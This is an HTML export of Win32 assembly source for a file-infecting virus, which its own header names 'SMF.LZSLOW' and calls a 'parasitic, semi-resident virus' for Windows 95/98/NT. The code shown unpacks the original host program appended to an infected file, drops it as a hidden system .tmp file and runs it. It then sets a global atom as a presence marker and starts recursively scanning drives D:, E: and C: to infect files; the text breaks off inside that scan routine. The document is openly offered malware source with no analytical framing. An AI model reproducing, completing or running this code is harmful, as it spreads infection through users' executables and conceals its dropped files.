<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; ============================ SMF.LZSLOW =============================</span><span class="sc0">
</span><span class="sc1">; Program   : SMF.LZSLOW </span><span class="sc0">
</span><span class="sc1">; Description   : Parasitic, "semi-resident" virus</span><span class="sc0">
</span><span class="sc1">; Last modified : 24.Apr.1999</span><span class="sc0">
</span><span class="sc1">; Purpose   : process handling under win32</span><span class="sc0">
</span><span class="sc1">; Target OS : Win95/98/NT</span><span class="sc0">
</span><span class="sc1">; Notes     :</span><span class="sc0">
</span><span class="sc1">; TODO      :</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win.inc</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">nop</span><span class="sc0"> </span><span class="sc1">; do you know, why my win32 asm progs start with NOP ?</span><span class="sc0">

</span><span class="sc1">; ================= Get our command line ====================</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmdline</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">
</span><span class="sc1">; ======== searching for end of the filename =================</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'" '</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">srch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">srch</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">srdone</span><span class="sc0"> </span><span class="sc1">; only for NT - sometimes there is no end spaces in command line</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">srch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">srdone</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">paramlist</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; store pointer to command line parameters</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc4">,</span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">FILE_END</span><span class="sc0">   </span><span class="sc1">; seeking to end of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mysize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; if first runned, then mysize = filesize (no victim)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">plength</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; reading last 4 bytes in file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is packed length data = 0 ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NODATA</span><span class="sc0"> </span><span class="sc1">; we are running for the first time from installer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">first</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; allocating some memory for packed data</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">,</span><span class="sc5">GMEM_FIXED</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">packed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; store pointer</span><span class="sc0">
</span><span class="sc1">; loading victim</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; esi=&amp;(packed_data)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">FILE_END</span><span class="sc0"> </span><span class="sc1">; locating packed data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mysize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">packed</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">,</span><span class="sc5">GMEM_FIXED</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; first dword</span><span class="sc0">
            </span><span class="sc1">; in packed data=original file length</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">unpacked</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; ====================== LZ77 family unpacker ==========================</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">unlzlp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">unlzret</span><span class="sc0"> </span><span class="sc1">; zero = end of packed data</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">lzref</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">; simply copy some bytes from in to out</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">unlzlp</span><span class="sc0">
</span><span class="sc5">lzref</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; processing data reference</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0"> </span><span class="sc1">; load reference offset (low 8 bits)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">; copy some bytes from already unpacked data</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">unlzlp</span><span class="sc0">
</span><span class="sc5">unlzret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; ====================== unpacker end ============================</span><span class="sc0">
</span><span class="sc1">; Creating unique filename (c:\windows\sys????.tmp, where ???? depends of current time)</span><span class="sc0">
</span><span class="sc1">; if we are starting from multiuser NT, name may be following:</span><span class="sc0">
</span><span class="sc1">;                       c:\winnt\profiles\&lt;username&gt;\sys????.tmp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fName</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SysTime</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">52352356h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; now eax=Hour/Minute xor Second/Millisecond</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'sys\'
</span><span class="sc0">    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0f0f0f0fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'aaaa'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'mpt.'</span><span class="sc0"> </span><span class="sc1">; .tmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; complete filename</span><span class="sc0">
</span><span class="sc1">; ============= writing to file ====================</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cmdline1</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc4">,\
</span><span class="sc0">            </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; for CloseHandle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">packed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">len1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc1">; handle already pushed</span><span class="sc0">
</span><span class="sc1">; ============= freeing memory ====================</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">,[</span><span class="sc5">packed</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">; =========== append the received command line to new program name ============</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">paramlist</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">cmdloop</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">cmdloop</span><span class="sc0">
</span><span class="sc1">; =============== now we are ready to run application ==================</span><span class="sc0">
</span><span class="sc1">; we'll use NULL for process directory, so its current directory will</span><span class="sc0">
</span><span class="sc1">; directory infected program runned from</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc4">,</span><span class="sc5">NORMAL_PRIORITY_CLASS</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,\
</span><span class="sc0">             </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pi</span><span class="sc0">

</span><span class="sc5">NODATA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; jumping here, if first time runned</span><span class="sc0">
</span><span class="sc1">; ================= CHECK FOR VIRUS PRESENCE =========================</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">foundNT</span><span class="sc0"> </span><span class="sc1">; don't check presense in memory on NT</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GlobalFindAtomA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFindAtomA</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; if atom 'Win32.LZ' defined, then another copy</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">quit1</span><span class="sc0">   </span><span class="sc1">; of virus already working ;)</span><span class="sc0">
</span><span class="sc5">foundNT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GlobalAddAtomA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAddAtomA</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">atom</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; ============ now let's scan directory tree and infect files ==============</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'\:D'</span><span class="sc0">   </span><span class="sc1">; scan disk D:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DiskScan</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'\:E'</span><span class="sc0">   </span><span class="sc1">; scan disk E:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DiskScan</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'\:C'</span><span class="sc0">   </span><span class="sc1">; scan disk C:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DiskScan</span><span class="sc0">
</span><span class="sc1">; ================ scanning is over... good bye ========================</span><span class="sc0">
</span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckStop</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">first</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">again</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">

</span><span class="sc1">; ==== It is a recursive function for scanning directory tree ====</span><span class="sc0">
</span><span class="sc5">DiskScan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurName</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Search</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">ss1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
